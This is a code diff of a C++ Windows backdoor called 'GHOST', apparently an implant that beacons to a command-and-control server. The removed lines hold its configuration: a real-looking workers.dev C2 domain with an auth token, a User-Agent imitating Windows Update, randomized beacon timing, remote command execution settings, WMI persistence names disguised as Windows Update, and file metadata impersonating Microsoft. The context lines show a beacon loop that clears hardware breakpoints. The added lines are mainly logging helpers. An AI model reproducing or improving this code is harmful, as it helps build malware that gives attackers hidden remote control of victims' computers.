@@ -12,47 +12,7 @@
 #pragma comment(lib, "winhttp.lib")
 
 // =====================================================================
-//  CONFIGURATION – all constants in one place (no missing externs)
-// =====================================================================
-namespace config {
-    // ------------------- C2 Network -------------------
-    // Hardcoded domain – use this directly for now (bypass XOR decryption)
-    const wchar_t* C2_DOMAIN = L"ghost-c2.sujallamichhane.workers.dev";
-    const uint16_t C2_PORT   = 443;
-
-    // Auth token – must match GHOST_BEACON_TOKEN on the server
-    const wchar_t* BEACON_TOKEN = L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260";
-
-    // User-Agent mimicking Windows Update client
-    const wchar_t* USER_AGENT = L"Microsoft-WNS/10.0";
-
-    // ------------------- Beacon Timing -------------------
-    const DWORD BEACON_MIN      = 60000;   // 1 minute
-    const DWORD BEACON_MAX      = 300000;  // 5 minutes
-    const DWORD MAX_FAILURES    = 5;
-    const DWORD BACKOFF_FACTOR  = 2;       // double sleep on consecutive failures
-
-    // ------------------- Command Execution -------------------
-    const DWORD CMD_TIMEOUT_MS  = 30000;   // 30 seconds
-    const size_t CMD_OUTPUT_MAX = 1024 * 64; // 64 KB
-
-    // ------------------- WMI Persistence (optional) -------------------
-    const wchar_t* WMI_CONSUMER_NAME = L"WindowsSystemUpdateConsumer";
-    const wchar_t* WMI_FILTER_NAME   = L"WindowsSystemUpdateFilter";
-    const wchar_t* WMI_BINDING_NAME  = L"WindowsSystemUpdateBinding";
-
-    // ------------------- PE Metadata -------------------
-    const wchar_t* PRODUCT_NAME      = L"Microsoft Windows Update Service";
-    const wchar_t* FILE_DESCRIPTION  = L"Windows Update Agent";
-    const wchar_t* COMPANY_NAME      = L"Microsoft Corporation";
-
-    // The encrypted domain bytes are no longer used, but kept for reference.
-    // const uint8_t C2_DOMAIN_ENCRYPTED[] = { ... };
-    // const size_t  C2_DOMAIN_LEN = 36;
-}
-
-// =====================================================================
-//  DEBUG LOGGING (OutputDebugString) – visible with DebugView
+//  DEBUG LOGGING – now accepts wstring (calls .c_str())
 // =====================================================================
 static void DebugLog(const wchar_t* msg) {
     OutputDebugStringW(L"[GHOST] ");
@@ -64,9 +24,17 @@ static void DebugLog(const char* msg) {
     OutputDebugStringA(msg);
     OutputDebugStringA("\n");
 }
+// Overload for std::wstring
+static void DebugLog(const std::wstring& msg) {
+    DebugLog(msg.c_str());
+}
+// Overload for std::string
+static void DebugLog(const std::string& msg) {
+    DebugLog(msg.c_str());
+}
 
 // =====================================================================
-//  JSON HELPERS (minimal, no external deps)
+//  JSON HELPERS (unchanged)
 // =====================================================================
 static std::string JsonEscape(const std::string& s) {
     std::string out;
@@ -117,7 +85,6 @@ static std::string JsonGetString(const std::string& json, const std::string& key
 // =====================================================================
 //  XOR DECRYPTION (kept but not used – for reference)
 // =====================================================================
-// (We're bypassing decryption; the function is kept if you want to restore it later)
 std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key) {
     // Not used – we hardcode the domain
     return L"";
@@ -230,7 +197,7 @@ static HttpResponse WinHttpRequest(
         WINHTTP_HEADER_NAME_BY_INDEX,
         &resp.statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
 
-    DebugLog((L"Status: " + std::to_wstring(resp.statusCode)).c_str());
+    DebugLog(L"Status: " + std::to_wstring(resp.statusCode));
 
     // Read response body
     DWORD available = 0;
@@ -327,9 +294,8 @@ static std::string BuildBeaconJson(const Session& s) {
     return j.str();
 }
 
-// Resolve C2 host – now returns hardcoded domain (bypass decryption)
+// Resolve C2 host – hardcoded to your worker
 static std::wstring GetC2Host() {
-    // Directly use the hardcoded domain
     return std::wstring(config::C2_DOMAIN);
 }
 
@@ -382,7 +348,7 @@ VOID BeaconLoop() {
     session.hwbpsCleared = ClearHardwareBreakpoints();
     session.sessionId    = GetHostnameHash() + L"|" + session.username;
 
-    DebugLog((L"Session ID: " + session.sessionId).c_str());
+    DebugLog(L"Session ID: " + session.sessionId);
 
     DWORD consecutiveFailures = 0;
 
